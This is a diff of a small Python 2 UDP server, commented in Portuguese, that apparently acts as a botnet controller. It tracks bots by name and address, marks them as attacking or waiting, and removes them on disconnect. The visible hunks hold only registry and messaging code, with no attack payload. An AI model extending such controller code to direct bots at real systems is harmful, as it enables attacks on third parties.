@@ -1,28 +1,8 @@
-"""
-Para lidar com problemas de portas em uso:
 
-Digite na linha de comando:
-	$ netstat -ano|findstr 12000
-# 12000 -> numero da porta que utilizamos #
-
-vc tera algo assim:
-	TCP    0.0.0.0:12000     IP_DO_HOST:PORTA_DO_HOST     19088
-# 19088 -> PID do processo malvado #
-
-Mate o processo malvado
-	tskill 19088
-
-Estrutura do bot[i]:
-('Nome_na_rede', ('End.IP.Na.Rede', porta), Atacando)
-bot[i][0] = 'Nome_na_rede'
-bot[i][1] = ('End.IP.Na.Rede', porta)
-    bot[i][1][0] = 'End.IP.Na.Rede'
-    bot[i][1][1] = porta
-bot[i][2] = Atacando 
-"""
 import threading
 import errno
 from socket import *
+
 serverPort = 12000
 serverSocket = socket(AF_INET, SOCK_DGRAM)
 serverSocket.bind(('', serverPort))
@@ -39,9 +19,7 @@ def ImprimeBots():
                 #                      Nome                             IP                                      Porta
                 print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1]) + ' | Atacando'
             else:
-                #                      Nome                             IP                                      Porta
                 print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1]) + ' | Aguardando'
-
         except error, e:
             print 'IP do bot nao encontrado\n'
 
@@ -172,6 +150,7 @@ def ThreadEnvio():
 
 try:              
     thread = threading.Thread(target = ThreadEnvio, args=())
+    thread.daemon = True
     thread.start()
 
     while True:
@@ -194,7 +173,7 @@ try:
             if i  != -1:
                 bots.pop(i)
                 print '\n' + message +  ' desconectado da botnet'
-        #serverSocket.sendto(modifiedMessage, clientAddress)
+
 except SystemExit:
     for i in range(len(bots)):
         EnviaMensagem(i, 'rem')
